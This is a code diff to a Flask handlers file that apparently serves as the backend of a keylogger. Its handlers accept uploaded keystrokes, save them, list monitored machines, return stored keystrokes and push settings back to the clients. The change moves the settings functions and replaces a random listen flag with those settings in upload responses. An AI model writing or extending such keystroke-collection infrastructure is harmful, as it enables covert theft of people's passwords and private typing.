@@ -1,6 +1,12 @@
 from flask import jsonify
 import services
 import random
+def handle_update_settings(request):
+    data = request.get_json()
+    return services.update_settings(data)
+
+def handle_get_settings():
+    return services.get_settings()
 
 def handle_notifications(request):
     text = request.data.decode("utf-8")
@@ -23,15 +29,15 @@ def handle_delete_notifications(request):
         return jsonify({"error": str(e)}), 500
 
 def handle_upload(request):
-    status_listen = random.randint(0, 1)
     if not request.is_json:
         return jsonify({"error": "Request must be JSON"}), 400
     data = request.get_json()
+    settings = handle_get_settings()
     if not data:
-        return jsonify({"data": False, "status_listen": status_listen}), 200
+        return jsonify({"data": False, "settings": settings}), 200
     try:
         services.save_keystrokes(data)
-        return jsonify({"data": True, "status_listen": status_listen}), 200
+        return jsonify({"data": True, "settings": settings}), 200
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
@@ -40,9 +46,3 @@ def handle_get_machines():
 
 def handle_get_keystrokes(request):
     return services.get_keystrokes(request)
-def handle_update_settings(request):
-    data = request.get_json()
-    return services.update_settings(data)
-
-def handle_get_settings():
-    return services.get_settings()
